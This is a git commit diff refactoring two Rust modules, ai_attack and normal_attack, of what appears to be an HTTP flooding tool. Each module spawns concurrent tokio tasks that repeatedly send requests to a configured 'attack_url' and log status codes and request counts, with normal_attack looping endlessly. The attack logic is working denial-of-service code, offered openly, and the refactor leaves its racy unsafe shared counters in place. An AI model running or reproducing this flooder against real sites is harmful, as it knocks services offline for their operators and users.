ba06f856abb2d1155eb28e9609ee59b56151a965
Carghai74 <94583299+carghai@users.noreply.github.com>
2022-09-30 12:48:23 -0400

    better code

--- src/ai_attack/mod.rs
+++ src/ai_attack/mod.rs
@@ -1,4 +1,3 @@
-
 use crate::extra_fn;
 use crate::ram_manger::{SAFE_PUB_VAR, UNSAFE_PUB_VAR};
 use crate::where_attack::AttackData;
@@ -10,47 +9,41 @@ pub async fn start(passed_var: AttackData) {
 }
 
 fn core_attack(passed_var: &AttackData) {
-    let error_threads = SAFE_PUB_VAR.lock();
-    match error_threads {
-        Err(e) => {
-            println!("error when starting thread: {}", e)
-        }
-        Ok(mut threads) => {
-            if threads.thread_on + 1 < passed_var.threads {
-                threads.thread_on += 1;
+    if let Ok(mut threads) = SAFE_PUB_VAR.lock() {
+        if threads.thread_on + 1 < passed_var.threads {
+            threads.thread_on += 1;
+            unsafe {
+                UNSAFE_PUB_VAR.threads_on += 1;
+            }
+            drop(threads);
+            tokio::spawn(async {
                 unsafe {
-                    UNSAFE_PUB_VAR.threads_on += 1;
-                }
-                drop(threads);
-                tokio::spawn(async {
-                    unsafe {
-                        let error_data = extra_fn::request(&UNSAFE_PUB_VAR.attack_url);
-                        match error_data.await {
-                            Ok(status_code) => {
-                                let wait = modify_pub_data(true);
-                                UNSAFE_PUB_VAR.amount_sent += 1;
-                                println!(
-                                    "Threads on {},\n Status code {},\n Request sent {}",
-                                    UNSAFE_PUB_VAR.threads_on,
-                                    status_code.status(),
-                                    UNSAFE_PUB_VAR.amount_sent,
-                                );
-                                wait.await;
-                            }
-                            Err(data) => {
-                                let wait = modify_pub_data(false);
-                                println!(
-                                    "Threads on {}, Status ERROR {}\n Request sent {}",
-                                    UNSAFE_PUB_VAR.threads_on,
-                                    data,
-                                    UNSAFE_PUB_VAR.amount_sent
-                                );
-                                wait.await;
-                            }
+                    let error_data = extra_fn::request(&UNSAFE_PUB_VAR.attack_url);
+                    match error_data.await {
+                        Ok(status_code) => {
+                            let wait = modify_pub_data(true);
+                            UNSAFE_PUB_VAR.amount_sent += 1;
+                            println!(
+                                "Threads on {},\n Status code {},\n Request sent {}",
+                                UNSAFE_PUB_VAR.threads_on,
+                                status_code.status(),
+                                UNSAFE_PUB_VAR.amount_sent,
+                            );
+                            wait.await;
+                        }
+                        Err(data) => {
+                            let wait = modify_pub_data(false);
+                            println!(
+                                "Threads on {}, Status ERROR {}\n Request sent {}",
+                                UNSAFE_PUB_VAR.threads_on,
+                                data,
+                                UNSAFE_PUB_VAR.amount_sent
+                            );
+                            wait.await;
                         }
                     }
-                });
-            }
+                }
+            });
         }
     }
 }
--- src/normal_attack/mod.rs
+++ src/normal_attack/mod.rs
@@ -1,6 +1,6 @@
 use tokio::time::Instant;
-use crate::extra_fn;
 
+use crate::extra_fn;
 use crate::ram_manger::{SAFE_PUB_VAR, UNSAFE_PUB_VAR};
 use crate::where_attack::AttackData;
 
@@ -11,50 +11,44 @@ pub async fn start(passed_var: AttackData) {
 }
 
 fn core_attack(passed_var: &AttackData) {
-    let error_threads = SAFE_PUB_VAR.lock();
-    match error_threads {
-        Err(e) => {
-            println!("error when starting thread: {}", e)
-        }
-        Ok(mut threads) => {
-            if threads.thread_on + 1 < passed_var.threads {
-                threads.thread_on += 1;
-                unsafe {
-                    UNSAFE_PUB_VAR.threads_on += 1;
-                }
-                drop(threads);
-                tokio::spawn(async {
-                    loop {
-                        let now = Instant::now();
-                        unsafe {
-                            let error_data = extra_fn::request(&UNSAFE_PUB_VAR.attack_url);
-                            match error_data.await {
-                                Ok(status_code) => {
-                                    UNSAFE_PUB_VAR.amount_sent += 1;
-                                    println!(
-                                        "Threads on {},\n Status code {},\n Time Passed for request {} sec,\n Request per 10 Millisecond {}",
-                                        UNSAFE_PUB_VAR.threads_on,
-                                        status_code.status(),
-                                        now.elapsed().as_secs(),
-                                        UNSAFE_PUB_VAR.amount_sent,
-                                    );
-                                }
-                                Err(data) => {
-                                    println!(
-                                        "Threads on {}, Status ERROR {}\n Time: {}\n Request per 10 Millisecond {}",
-                                        UNSAFE_PUB_VAR.threads_on,
-                                        data,
-                                        now.elapsed().as_secs(),
-                                        UNSAFE_PUB_VAR.amount_sent
-                                    );
-                                }
+    if let Ok(mut threads) = SAFE_PUB_VAR.lock() {
+        if threads.thread_on + 1 < passed_var.threads {
+            threads.thread_on += 1;
+            unsafe {
+                UNSAFE_PUB_VAR.threads_on += 1;
+            }
+            drop(threads);
+            tokio::spawn(async {
+                loop {
+                    let now = Instant::now();
+                    unsafe {
+                        let error_data = extra_fn::request(&UNSAFE_PUB_VAR.attack_url);
+                        match error_data.await {
+                            Ok(status_code) => {
+                                UNSAFE_PUB_VAR.amount_sent += 1;
+                                println!(
+                                    "Threads on {},\n Status code {},\n Time Passed for request {} sec,\n Request per 10 Millisecond {}",
+                                    UNSAFE_PUB_VAR.threads_on,
+                                    status_code.status(),
+                                    now.elapsed().as_secs(),
+                                    UNSAFE_PUB_VAR.amount_sent,
+                                );
+                            }
+                            Err(data) => {
+                                println!(
+                                    "Threads on {}, Status ERROR {}\n Time: {}\n Request per 10 Millisecond {}",
+                                    UNSAFE_PUB_VAR.threads_on,
+                                    data,
+                                    now.elapsed().as_secs(),
+                                    UNSAFE_PUB_VAR.amount_sent
+                                );
                             }
                         }
                     }
-                });
-            } else {
-                extra_fn::time_function();
-            }
+                }
+            });
+        } else {
+            extra_fn::time_function();
         }
     }
 }
